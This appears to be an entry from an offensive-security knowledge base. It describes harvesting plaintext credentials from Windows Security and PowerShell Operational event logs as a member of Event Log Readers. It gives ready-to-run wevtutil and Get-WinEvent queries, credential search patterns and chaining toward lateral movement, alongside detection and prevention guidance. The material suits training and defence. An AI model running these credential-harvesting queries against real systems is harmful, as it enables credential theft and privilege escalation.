examples.label: Query Security log for credential-bearing command lines (with creds)

notes:
=== Event Log Readers — Credential Harvest from Security Log ===
Members can read event logs — find credentials passed as command-line args in 4688 events.

=== WHY THIS WORKS ===
When process creation auditing + command-line value logging is enabled:
Every launched process generates Event ID 4688 with the FULL command line.
Commands like net use, runas, backup scripts frequently pass passwords as inline parameters.
These credentials are captured verbatim in plaintext in the event log.

=== ATTACK FLOW ===
Check membership: net localgroup "Event Log Readers"

Using wevtutil (works for Event Log Readers — does NOT require local admin):
  wevtutil qe Security /rd:true /f:text | Select-String "/user"
  wevtutil qe Security /rd:true /f:text /r:<REMOTE> /u:<user> /p:<pass> | Select-String "/user"

Using Get-WinEvent (requires local admin OR registry ACL mod on Security log):
  Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
  NOTE: wevtutil does NOT have the local admin restriction — prefer wevtutil for Event Log Readers

PowerShell Operational log (readable by ANY user — no group membership needed):
  Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' | Where-Object {$_.Message -match 'password|credential'}

=== CREDENTIAL PATTERNS TO SEARCH ===
/user    → net use, runas, wevtutil remote queries
-u       → many tools accepting credentials
password → script parameters and variable names
-p       → short password flags
pass     → variable names in logged script blocks

=== CHAINING CONTEXT ===
4688 credential harvest → service account passwords → lateral movement
4688 reveals DA running backup scripts with inline creds → immediate escalation
PowerShell Operational log → script block reveals hardcoded creds in admin automation
Combine wevtutil with remote queries → harvest credentials from other hosts' logs if permitted

=== WHAT TO LOOK FOR ===
4688 events enabled? Check: auditpol /get /subcategory:"Process Creation"
Command-line value logging: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit\ProcessCreationIncludeCmdLine_Enabled
Event Log Readers membership in non-admin accounts = frequent misconfiguration
Priority accounts to look for in logs: service accounts, backup accounts, domain admins running scripts

recommended.note: Pivot to broader on-disk credential hunting.

name: Event Log Readers - Hunt Credentials in Security Logs
description: Members of Event Log Readers can read the Security log. Process-creation events (4688) often capture command lines containing plaintext passwords passed via /user - grep them out.

defense.why_it_works: When Windows process creation auditing (Event ID 4688) with command-line logging is enabled, credentials passed as command-line arguments to tools like `net use`, `runas`, or custom scripts are recorded in plaintext in the Security event log. Members of the Event Log Readers group can query this log without admin rights, discovering captured credentials.
defense.prerequisites: Membership in the Event Log Readers local group. Process creation auditing with command-line logging enabled via Group Policy. Administrators previously passing credentials as command-line parameters.
defense.impact: Plaintext credential recovery from Security event log. Discovered credentials enable lateral movement, privilege escalation, or further account compromise.
defense.detection: wevtutil or Get-WinEvent queries against the Security log by non-admin users. High volume of event log queries from a single user. SIEM: alerting on Event Log Readers membership changes.
defense.artifacts: Security event log query by non-admin | wevtutil process execution by Event Log Readers member | Credentials if discovered in 4688 events
defense.prevention: Never pass credentials as command-line arguments to scripts or tools — use credential objects, PSCredential, or secrets managers instead. Audit Event Log Readers group membership. Consider restricting 4688 logging to exclude sensitive command patterns, or use Windows Defender Credential Guard.
defense.misconfiguration: Process creation auditing with command-line logging enabled, but administrators pass credentials inline: `net use \\server\share /user:admin Password123!`. Event Log Readers group has unnecessary members.
defense.vulnerable_config:
# Command logged in Event ID 4688:
# net use \\fileserver\share /user:inlanefreight\julie.clay Welcome1

# Attacker in Event Log Readers can query:
wevtutil qe Security /rd:true /f:text | Select-String "/user"
defense.secure_config:
# Audit Event Log Readers members
net localgroup 'Event Log Readers'

# Use PSCredential instead of inline passwords:
$cred = Get-Credential
New-PSDrive -Name Z -PSProvider FileSystem -Root \\server\share -Credential $cred

# Remove command-line logging for sensitive operations
# or use Windows Credential Guard to protect credentials
